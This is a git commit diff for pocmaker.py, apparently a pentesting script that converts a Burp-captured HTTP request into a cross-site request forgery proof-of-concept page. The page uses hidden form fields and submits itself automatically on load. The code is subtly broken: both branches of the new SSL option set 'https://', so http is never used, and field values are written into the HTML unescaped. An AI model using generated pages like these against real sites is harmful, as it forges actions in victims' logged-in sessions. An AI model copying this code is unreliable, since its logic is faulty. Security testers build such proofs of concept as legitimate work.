fb932f81ca573231e9e6e56852144b1d53670ac1
Sanzey Thomas <tsanzey@student.42.fr>
2019-06-24 16:33:34 +0200

    Update pocmaker.py
    Ajout du support http/https ajout d'une fonction pour ne pas auto submit

--- pocmaker.py
+++ pocmaker.py
@@ -4,12 +4,17 @@ parser = OptionParser()
 parser.add_option("-f", "--file", dest="filename",
                   help="input request FILE from burp", metavar="FILE")
 parser.add_option("-o", "--out", dest="dest_file",
-                  help="write PoC to FILE", metavar="OUT")
+                  help="write PoC to FILE", metavar="OUT", default="poc.html")
+parser.add_option("-s", "--SSL", dest="ssl",
+                  help="Default https request, --SSL False to use http instead", metavar="SSL", default=True)
+parser.add_option("-b", "--button", dest="button",
+                  help="Default autosubmit", metavar="button")
+
 
 (options, args) = parser.parse_args()
 
 f= open(options.filename,"r")
-out = open("test.html","w+")
+out = open(options.dest_file,"w+")
 
 file = f.readlines()
 
@@ -25,13 +30,19 @@ for line in file:
 		method = "POST"
 		endpoint = line.split()[1]
 	if line.startswith("Host:"):
-		url = "https://" + line.split()[1]
-		out.write('<script>document.getElementById("CSRF").submit()</script>\n')
-		out.write("<form method=" + method + " id=CSRF action=" + url + endpoint +">\n")
+		if options.ssl == True:
+			protocol = "https://"
+		else :
+			protocol = "https://"
+		url = protocol + line.split()[1]
+		if options.button == None:
+			out.write('<body onload="csrf();"></body>\n')
+			out.write('<script>function csrf() {document.getElementById("CSRF").submit()}</script>\n')
+		out.write("<form method='" + method + "' id='CSRF' action='" + url + endpoint +"'>\n")
 	if name != "" and len(line) != 0:
 		if boundary in line:
 			line = ""
-		out.write("\t<input type=hidden name=" + name + " id=" + name + " value=" + line+ ">\n")
+		out.write("\t<input type='hidden' name='" + name + "' id='" + name + "' value='" + line+ "'>\n")
 		name = ""
 	if line.startswith("Content-Type:"):
 		content = line.split()
@@ -48,6 +59,8 @@ if boundary == "":
 	data = body.split("&")
 	for d in data:
 		splits = d.split("=")
-		out.write("\t<input type=hidden name=" + splits[0] + " id=" + splits[0] + " value=" + splits[1]+ ">\n")
+		out.write("\t<input type='hidden' name='" + splits[0] + "' id='" + splits[0] + "' value='" + splits[1]+ "'>\n")
 
+if options.button != None:
+	out.write("\t<input type='Submit' value='Submit'>\n")
 out.write("</form>\n")
